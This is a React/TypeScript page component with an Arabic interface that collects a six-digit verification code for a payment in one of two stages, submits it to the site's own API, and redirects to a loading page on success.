import { useState, useEffect } from "react";
import { useLocation } from "wouter";

export default function OTP() {
  const [location] = useLocation();
  const [otp, setOtp] = useState("");
  const [paymentId, setPaymentId] = useState<number | null>(null);
  const [stage, setStage] = useState("first");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const id = params.get("paymentId");
    const s = params.get("stage") || "first";
    if (id) setPaymentId(Number(id));
    setStage(s);
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!otp || !paymentId) return;

    setLoading(true);
    setError("");

    try {
      const response = await fetch("/api/trpc/payment.submitOtp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          paymentId,
          otpCode: otp,
          stage,
        }),
      });

      const data = await response.json();

      if (data.result?.data?.success) {
        // Redirect to loading page
        window.location.href = `/loading?paymentId=${paymentId}`;
      } else {
        setError(data.result?.data?.message || "حدث خطأ في التحقق");
      }
    } catch (err) {
      setError("خطأ في الاتصال بالخادم");
    } finally {
      setLoading(false);
    }
  };

  const stageLabel = stage === "first" ? "الأول" : "الثاني";

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-lg shadow-lg p-8 max-w-md w-full">
        <h1 className="text-2xl font-bold text-gray-800 mb-2">التحقق من الرمز {stageLabel}</h1>
        <p className="text-gray-600 mb-6">تم إرسال رمز التحقق إلى رقم جوالك</p>

        {error && (
          <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4">
            {error}
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              أدخل الرمز المرسل
            </label>
            <input
              type="text"
              value={otp}
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
              placeholder="000000"
              maxLength={6}
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-center text-2xl tracking-widest"
              required
            />
          </div>

          <button
            type="submit"
            disabled={loading || otp.length !== 6}
            className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white font-bold py-2 px-4 rounded-lg transition"
          >
            {loading ? "جاري التحقق..." : "تحقق"}
          </button>
        </form>

        <p className="text-sm text-gray-500 mt-4 text-center">
          لم تستقبل الرمز؟ <button className="text-blue-600 hover:underline">أعد الإرسال</button>
        </p>
      </div>
    </div>
  );
}
